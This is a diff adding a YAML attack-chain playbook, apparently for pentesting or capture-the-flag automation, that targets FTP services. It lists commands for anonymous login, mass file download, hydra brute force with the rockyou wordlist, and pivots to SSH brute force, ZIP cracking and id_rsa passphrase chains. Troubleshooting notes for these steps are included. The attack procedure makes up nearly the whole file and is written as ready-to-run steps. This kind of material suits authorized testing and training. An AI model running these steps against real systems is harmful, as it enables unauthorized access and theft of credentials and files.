@@ -1,0 +1,82 @@
+chain_id: ftp_anonymous_and_brute
+title: "FTP — anonymous login + brute force fallback"
+severity: HIGH
+tags: [ftp, anonymous, brute-force, file-disclosure]
+
+trigger:
+  any_of:
+    - { port: 21, service: ftp }
+    - { service_pattern: "(?i)ftp" }
+
+description: |
+  Open FTP service detected. First attempt is always anonymous login. If that
+  fails, fall back to credential brute force. Any files retrieved (.txt with
+  user/pass, ZIP archives, id_rsa keys) feed downstream chains
+  (zip_password, idrsa_passphrase, ssh_brute_force).
+
+steps:
+  - id: 1
+    title: "Anonymous connection"
+    command: ftp $VICTIMA
+    notes: |
+      User: anonymous · Password: empty or anonymous@. Prompt becomes 'ftp>'.
+
+  - id: 2
+    title: "Connection on a non-standard FTP port"
+    command: ftp $VICTIMA 10021
+    notes: |
+      If nmap detected FTP on a port other than 21 (e.g. 10021, 2121, 8021),
+      pass it as the second argument. Common when a username arrives via SMB
+      or a text note that points to another port.
+
+  - id: 3
+    title: "Internal commands inside the FTP client"
+    command: |
+      binary
+      prompt off
+      ls
+      mget *
+      get nombre_fichero
+      bye
+    notes: |
+      `binary` switches to binary transfer (required for images/ZIPs).
+      `prompt off` disables per-file confirmation. `ls` already lists hidden
+      files inside FTP — do NOT use `ls -la` (FTP interprets `-la` as a
+      filename and returns NT_STATUS_NO_SUCH_FILE).
+
+  - id: 4
+    title: "Inspect retrieved files (now in Bash)"
+    command: |
+      ls -la
+      file *
+      cat fichero.txt
+    notes: |
+      After `bye`, every command runs in Bash, not FTP. `ls -la` works again.
+
+  - id: 5
+    title: "If anonymous fails, brute force credentials"
+    command: hydra -L users -P /usr/share/wordlists/rockyou.txt ftp://$VICTIMA
+
+  - id: 6
+    title: "Pivot based on what was found"
+    notes: |
+      If a .txt with user/pass appears, try them on SSH (chain ssh_brute_force)
+      or, if the FTP port is non-standard, on FTP again. If a password-protected
+      ZIP appears, see chain zip_password. If an id_rsa appears, see chain
+      idrsa_passphrase.
+
+common_errors:
+  - error: "?Invalid command (when running zip2john / john from the ftp> prompt)"
+    solution: |
+      Those commands belong to Bash. Exit FTP first with: bye, then run them.
+  - error: "NT_STATUS_NO_SUCH_FILE listing \\-la"
+    solution: |
+      `ls -la` was typed inside smbclient or FTP. Those clients treat `-la`
+      as a filename. The correct command is just: ls
+  - error: "Login failed"
+    solution: |
+      Server does not allow anonymous. Try credentials obtained elsewhere or
+      brute-force: hydra -L users -P /usr/share/wordlists/rockyou.txt ftp://$VICTIMA
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp
